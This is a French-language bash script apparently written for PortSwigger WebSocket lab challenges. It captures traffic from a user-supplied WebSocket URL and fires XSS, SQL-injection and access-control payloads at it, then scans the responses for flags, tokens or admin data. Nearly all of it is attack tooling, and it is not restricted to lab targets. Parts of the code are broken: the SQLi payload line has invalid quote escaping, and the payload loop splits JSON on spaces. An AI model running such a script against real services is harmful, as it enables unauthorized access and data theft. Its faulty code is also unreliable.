#!/bin/bash

# Dépendances : websocat, jq
# Installation : sudo apt install websocat jq

# Génération de payloads adaptés à chaque challenge
generate_payloads() {
    challenge=$1
    case $challenge in
        1)
            # XSS / Manipulation
            echo '{"message":"<img src=x onerror=alert(1)>"}'
            echo '{"message":"<svg/onload=alert(1)>"}'
            ;;
        2)
            # CSWH
            echo 'READY'
            ;;
        3)
            # Contrôle d’accès
            echo '{"action":"get_all_users"}'
            echo '{"action":"get_profile","user":"admin"}'
            ;;
        4)
            # SQLi
            echo '{"user":"admin\' OR \'1\'=\'1"}'
            echo '{"user":"admin"}'
            ;;
        *)
            # Générique
            echo '{"action":"ping"}'
            ;;
    esac
}

# Analyse : capture et extraction automatique des champs/messages
analyze() {
    ws_url="$1"
    echo "[*] Analyse du flux WebSocket sur $ws_url"
    # Capture 5 messages en 10 secondes
    timeout 10 websocat -E "$ws_url" > ws_analysis.log 2>/dev/null &
    ws_pid=$!
    sleep 12
    kill $ws_pid 2>/dev/null
    echo "[*] Messages capturés :"
    cat ws_analysis.log
    # Extraction automatique des champs JSON (si possible)
    if grep -q '{' ws_analysis.log; then
        echo "[*] Champs JSON détectés :"
        grep '{' ws_analysis.log | jq 'keys' 2>/dev/null | sort | uniq
    else
        echo "[*] Aucun message JSON détecté."
    fi
}

# Attaque : envoi automatisé de payloads, affichage des réponses
attack() {
    ws_url="$1"
    challenge="$2"
    echo "[*] Attaque automatisée sur $ws_url (challenge $challenge)"
    > ws_attack.log
    for payload in $(generate_payloads $challenge); do
        echo "[*] Envoi du payload : $payload"
        response=$(echo "$payload" | websocat -E "$ws_url" 2>/dev/null)
        echo "Payload: $payload" >> ws_attack.log
        echo "Réponse: $response" >> ws_attack.log
        echo "------------------------" >> ws_attack.log
        echo "[*] Réponse : $response"
    done
}

# Contrôle : détection automatique de succès dans les réponses
control() {
    echo "[*] Contrôle des résultats (recherche de succès, flag, admin, etc.)"
    if grep -Eiq 'flag|success|admin|token|root|alert' ws_attack.log; then
        echo "[+] Exploitation potentielle détectée :"
        grep -Eio 'flag\{[^}]+\}|success|admin|token|root|alert' ws_attack.log | sort | uniq
        echo "[*] Arrêt du test (exploit trouvé)."
        exit 0
    else
        echo "[-] Aucun indicateur d’exploitation trouvé."
    fi
}

# Démarche récursive : relance une attaque si aucun succès, jusqu’à 3 rounds
recursive_methodology() {
    ws_url="$1"
    challenge="$2"
    round=${3:-1}
    echo "=== Round $round ==="
    analyze "$ws_url"
    attack "$ws_url" "$challenge"
    control
    if [[ $round -lt 3 ]]; then
        echo "[*] Nouvelle tentative avec des variantes…"
        sleep 2
        recursive_methodology "$ws_url" "$challenge" $((round+1))
    fi
}

# Menu principal
main_menu() {
    clear
    echo "=============================="
    echo "  CHALLENGES WEBSOCKET PORTSWIGGER"
    echo "=============================="
    echo "1) Manipulation de messages (XSS)"
    echo "2) Cross-site WebSocket Hijacking (CSWH)"
    echo "3) Contrôle d’accès défaillant"
    echo "4) Injection SQL via WebSocket"
    echo "------------------------------"
    echo "0) Quitter"
    echo "=============================="
    read -p "Sélectionnez le numéro du challenge : " challenge_num

    if [[ "$challenge_num" -eq 0 ]]; then
        echo "Au revoir !"
        exit 0
    fi

    read -p "Entrez l'URL WebSocket (ex: wss://target/ws) : " ws_url

    recursive_methodology "$ws_url" "$challenge_num"

    echo
    echo "Analyse terminée. Consultez ws_analysis.log et ws_attack.log pour le détail."
    read -p "Appuyez sur Entrée pour revenir au menu principal..."
    main_menu
}

main_menu
